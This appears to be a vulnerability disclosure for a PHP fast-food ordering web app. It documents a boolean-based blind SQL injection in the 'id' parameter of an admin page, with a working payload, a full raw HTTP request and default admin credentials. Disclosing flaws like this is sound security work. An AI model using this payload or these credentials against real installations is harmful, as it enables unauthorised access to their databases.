# Fast Food Ordering System v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15366/fast-food-ordering-system-phpoop-free-source-code.html

Vulnerability File: /ffos/admin/categories/manage_category.php?id=

Vulnerability location: /ffos/admin/categories/manage_category.php?id=, id

Current database name: ffos_db,length is 7

[+] Payload: /ffos/admin/categories/manage_category.php?id=6%27%20and%20length(database())%20=7--+ // Leak place ---> id


```sql
GET /ffos/admin/categories/manage_category.php?id=6%27%20and%20length(database())%20=7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=rlr2a917ahfp4mc52mm9a7kvvm
Connection: close
```

When length (database ()) = 6, Content-Length: 2421
![image](https://user-images.githubusercontent.com/54017627/171351135-dcf725c0-30b6-4e95-9f54-bbd110f4067d.png)

![image](https://user-images.githubusercontent.com/54017627/171351115-c90af390-1d36-4e61-bd1d-2bde4a6fa610.png)

When length (database ()) = 7, Content-Length: 2561
![image](https://user-images.githubusercontent.com/54017627/171351190-1342fd39-23bc-4f89-9685-8a35d7a856b4.png)

![image](https://user-images.githubusercontent.com/54017627/171351019-6451e120-7073-4b8c-bad4-d5041e848521.png)
